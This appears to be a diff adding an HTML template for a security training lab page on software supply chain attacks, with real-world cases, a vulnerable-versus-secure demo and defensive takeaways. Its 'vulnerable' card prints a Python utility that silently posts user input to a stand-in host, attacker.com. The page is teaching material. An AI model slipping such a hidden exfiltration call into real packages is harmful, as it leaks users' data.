@@ -1,0 +1,146 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="vuln-page">
+  <a href="/" class="back">← Back</a>
+  <h1>A03 — Software Supply Chain Failures</h1>
+
+  <div class="explainer">
+    <h2>What is it?</h2>
+    <p>
+      Supply Chain attacks happen when <strong>malicious code sneaks in through
+      a dependency</strong> — an npm package, a PyPI library, or a CDN script
+      you didn't write but fully trust.
+    </p>
+    <p>
+      Real examples: <strong>event-stream (npm, 2018)</strong> — a popular package
+      was taken over and malicious code was added to steal crypto wallets.
+      <strong>SolarWinds (2020)</strong> — attackers pushed malicious updates to
+      18,000+ organizations via a trusted software vendor.
+    </p>
+    <p>
+      The scary part: <strong>your code is fine — the attack hides in code you import.</strong>
+    </p>
+  </div>
+
+  <!-- Attack Diagram -->
+  <div class="diagram">
+    <div class="diagram-step">Your App</div>
+    <div class="diagram-arrow">imports</div>
+    <div class="diagram-step bad"> Malicious Package<br><small>looks legitimate</small></div>
+    <div class="diagram-arrow">does job +</div>
+    <div class="diagram-step danger"> Sends your data<br>to attacker.com</div>
+  </div>
+
+  <div class="lab-grid">
+
+    <!-- VULNERABLE -->
+    <div class="lab-card vulnerable">
+      <h2> Vulnerable</h2>
+      <p>Type some text. The "package" processes it — but also <strong>silently exfiltrates it</strong>.</p>
+      <div class="controls">
+        <label>Enter text:</label>
+        <input type="text" id="vuln-input" value="my secret data" style="width:180px">
+        <button onclick="fetchVuln()">Process</button>
+      </div>
+      <pre id="vuln-result">// result will appear here</pre>
+      <div class="code-block">
+        <h3>What the malicious package does</h3>
+        <code><pre>
+# Looks like a normal utility function
+def to_uppercase(text):
+    #  Does the legitimate job
+    result = text.upper()
+
+    #  Hidden malicious side effect
+    requests.post("https://attacker.com/collect",
+                  json={"stolen": text})
+    return result
+        </pre></code>
+      </div>
+    </div>
+
+    <!-- SECURE -->
+    <div class="lab-card secure">
+      <h2> Secure</h2>
+      <p>Same result — using <strong>built-in Python</strong>, no third-party package needed.</p>
+      <div class="controls">
+        <label>Enter text:</label>
+        <input type="text" id="secure-input" value="my secret data" style="width:180px">
+        <button onclick="fetchSecure()">Process</button>
+      </div>
+      <pre id="secure-result">// result will appear here</pre>
+      <div class="code-block">
+        <h3>Secure approach</h3>
+        <code><pre>
+#  Use built-in language features
+# when a simple operation doesn't need
+# a third-party package
+
+def to_uppercase(text):
+    return text.upper()  # that's it!
+
+# Also: pin your dependencies
+# requirements.txt:
+# requests==2.31.0  ← exact version
+# Not: requests>=2.0  ← dangerous range
+        </pre></code>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Real World Examples -->
+  <div class="examples-box">
+    <h2> Real World Supply Chain Attacks</h2>
+    <div class="examples-grid">
+      <div class="example-card">
+        <h3>event-stream (2018)</h3>
+        <p>npm package with 2M weekly downloads. Maintainer handed it to a stranger who injected code to steal Bitcoin wallets.</p>
+      </div>
+      <div class="example-card">
+        <h3>SolarWinds (2020)</h3>
+        <p>Attackers compromised SolarWinds' build system. Malicious updates shipped to 18,000+ customers including US government agencies.</p>
+      </div>
+      <div class="example-card">
+        <h3>PyPI typosquatting</h3>
+        <p>Packages named <code>requeests</code>, <code>colourama</code> — one typo installs malware instead of the real library.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="takeaway">
+    <h2> Key Takeaway</h2>
+    <ul>
+      <li><strong>Audit your dependencies</strong> — run <code>pip audit</code> or <code>npm audit</code> regularly.</li>
+      <li><strong>Pin exact versions</strong> in <code>requirements.txt</code> — don't use open ranges like <code>>=</code>.</li>
+      <li><strong>Check before you install</strong> — look at download counts, maintainer history, source code.</li>
+      <li><strong>Use built-ins</strong> when a 3rd party package isn't truly needed.</li>
+      <li>Use <strong>hash verification</strong> — <code>pip install --require-hashes</code>.</li>
+    </ul>
+  </div>
+</div>
+
+<script>
+async function fetchVuln() {
+  const text = document.getElementById("vuln-input").value;
+  const res = await fetch("/a03/vulnerable/process", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ text })
+  });
+  const data = await res.json();
+  document.getElementById("vuln-result").textContent = JSON.stringify(data, null, 2);
+}
+
+async function fetchSecure() {
+  const text = document.getElementById("secure-input").value;
+  const res = await fetch("/a03/secure/process", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ text })
+  });
+  const data = await res.json();
+  document.getElementById("secure-result").textContent = JSON.stringify(data, null, 2);
+}
+</script>
+{% endblock %}
